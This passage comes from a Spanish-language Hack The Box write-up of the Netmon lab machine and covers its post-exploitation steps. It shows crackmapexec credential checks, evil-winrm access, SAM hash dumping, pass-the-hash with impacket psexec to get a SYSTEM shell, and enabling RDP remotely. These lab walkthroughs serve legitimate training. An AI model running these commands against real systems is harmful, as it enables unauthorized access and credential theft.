+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.10.152 -u <span style="color:#e6db74">&#39;BerserkP&#39;</span> -p <span style="color:#e6db74">&#39;B3rs3rkP123$!&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:NETMON<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:netmon<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> netmon<span style="color:#ae81ff">\B</span>erserkP:B3rs3rkP123$! <span style="color:#f92672">(</span>HackeadoPrro!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="Root">Accediendo a la Máquina como Administrador</h3>
+<p>Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta <strong>evilWinrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.10.152 -u <span style="color:#e6db74">&#39;BerserkP&#39;</span> -p <span style="color:#e6db74">&#39;B3rs3rkP123$!&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.4
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style="color:#f92672">()</span> <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\B</span>erserkP<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>netmon<span style="color:#ae81ff">\b</span>erserkp
+</span></span></code></pre></div><p>Ya solo es cuestión de buscar la flag del root, que siempre está en el escritorio del usuario Administrator y listo.</p>
+<h3 id="Extras">Obteniendo Información Extra y Otras Formas de Acceder a la Máquina</h3>
+<p>Una vez que hemos podido agregar nuestras contraseñas al grupo de administradores, podemos aprovechar para obtener los SAM Hashes de todos los admins, esto lo podemos hacer con <strong>Crackmapexec</strong> de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.10.152 -u <span style="color:#e6db74">&#39;BerserkP&#39;</span> -p <span style="color:#e6db74">&#39;B3rs3rkP123$!&#39;</span> --sam
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:NETMON<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:netmon<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> netmon<span style="color:#ae81ff">\B</span>erserkP:B3rs3rkP123$! <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping SAM hashes
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           Administrator:...:...:...:::
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           Guest:...:...:...:::
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           DefaultAccount:...:...:...:::
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           BerserkP:...:...:...:::
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Added <span style="color:#ae81ff">4</span> SAM hashes to the database
+</span></span></code></pre></div><p>Estos hashes los podemos usar para aplicar un <strong>PassTheHash</strong> para conectarnos usando otras herramientas, por ejemplo, la herramienta <strong>psexec</strong> y si estuviera abierto el protocolo RDP, sería con la herramienta <strong>xfreerdp</strong>, vamos a probar con cada una.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>PassTheHash</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>En seguridad informática, pasar el hash es una técnica de piratería que permite a un atacante autenticarse en un servidor o servicio remoto utilizando el hash NTLM o LanMan subyacente de la contraseña de un usuario, en lugar de solicitar la contraseña de texto sin formato asociada como suele ser el caso.</em></td>
+			</tr>
+	</tbody>
+</table>
+<h4 id="psexec">Accediendo a la Máquina con Psexec</h4>
+<p>Por defecto, deberías tener instalado el <strong>psexec.py</strong>, buscalo con el comando <strong>locate</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>locate psexec.py
+</span></span><span style="display:flex;"><span>/usr/local/bin/psexec.py
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/psexec.py
+</span></span></code></pre></div><p>En mi caso, voy a copiar el del directorio <strong>impacket</strong> y lo voy a usar desde donde lo tenga copiado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /usr/share/doc/python3-impacket/examples/psexec.py .
+</span></span></code></pre></div><p>Y ahora, vamos a usarlo, utilizando la parte final del hash perteneciente al usuario administrador:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 psexec.py WORKGROUP/Administrator@10.10.10.152 -hashes :d0f7...
+</span></span><span style="display:flex;"><span>Impacket v0.10.0 - Copyright <span style="color:#ae81ff">2022</span> SecureAuth Corporation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.10.10.152.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file AYHbMdFh.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.10.10.152.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service Fomi on 10.10.10.152.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service Fomi.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.14393<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2016</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Listo, ganamos acceso utilizando la herramienta <strong>psexec.py</strong>.</p>
+<h4 id="rdp">Accediendo a la Máquina con xfreerdp - Remmina</h4>
+<p>Para este caso, vamos a primero levantar el <strong>servicio RDP</strong> utilizando <strong>Crackmapexec</strong>, para esto tambien puedes usar el usuario administrador y su hash o tu usuario, queda a tu elección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 10.10.10.152 -u <span style="color:#e6db74">&#39;BerserkP&#39;</span> -p <span style="color:#e6db74">&#39;B3rs3rkP123$!&#39;</span> -M rdp -o action<span style="color:#f92672">=</span>enable
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:NETMON<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:netmon<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> netmon<span style="color:#ae81ff">\B</span>erserkP:B3rs3rkP123$! <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>RDP         10.10.10.152    <span style="color:#ae81ff">445</span>    NETMON           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RDP enabled successfully
+</span></span></code></pre></div><p>E igual, podemos comprobar con <strong>nmap</strong>, que este servicio ya esta operando en la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">3389</span> --open -T5 -vvv -n -Pn 10.10.10.152
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 23:22
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.152 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 3389/tcp on 10.10.10.152
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 23:22, 0.15s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.152
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.066s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE       REASON
+</span></span><span style="display:flex;"><span>3389/tcp open  ms-wbt-server syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.24 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>44B<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>44B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Ahora, usemos la herramienta <strong>xfreerdp</strong> para conectarnos a la consola:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>xfreerdp /u:BerserkP /p:B3rs3rkP123$! /v:10.10.10.152:3389
+</span></span></code></pre></div><p>No nos deja conectarnos, es posible que sea por como esta configurada la máquina en HTB, pero usemos otra herramienta muy similar a <strong>xfreerdp</strong> que se llama <strong>remmina</strong>, vamos a instalarla primero:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt install remmina
+</span></span></code></pre></div><p>Y vamos a ejecutarla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>remmina
+</span></span></code></pre></div><p>Observa que nos pide una IP a la cual conectarnos, usemos la de la máquina:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura10.png">
+</p>
+<p>Ahora, pongamos los datos del usuario, esta vez usare mi usuario, prueba con los demás usuarios que ya obtuvimos antes:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura11.png">
+</p>
+<p>Y listo, nos hemos conectado a la máquina:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-netmon/Captura12.png">
+</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.cvedetails.com/cve/CVE-2018-9276/" target="_blank" rel="noopener noreferrer">https://www.cvedetails.com/cve/CVE-2018-9276/</a></li><li><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html" target="_blank" rel="noopener noreferrer">https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html</a></li><li><a href="https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/" target="_blank" rel="noopener noreferrer">https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/</a></li><li><a href="https://www.mundodeportivo.com/urbantecno/windows/agrega-un-usuario-al-grupo-de-administradores-local-en-windows-via-comando" target="_blank" rel="noopener noreferrer">https://www.mundodeportivo.com/urbantecno/windows/agrega-un-usuario-al-grupo-de-administradores-local-en-windows-via-comando</a></li><li><a href="https://www.ngi.es/crackmapexec-post-explotacion-entornos-active-directory/" target="_blank" rel="noopener noreferrer">https://www.ngi.es/crackmapexec-post-explotacion-entornos-active-directory/</a></li><li><a href="https://thehackerway.com/2021/11/04/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-1-de-2/" target="_blank" rel="noopener noreferrer">https://thehackerway.com/2021/11/04/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-1-de-2/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-jerry/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Jerry - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-blue/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Blue - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
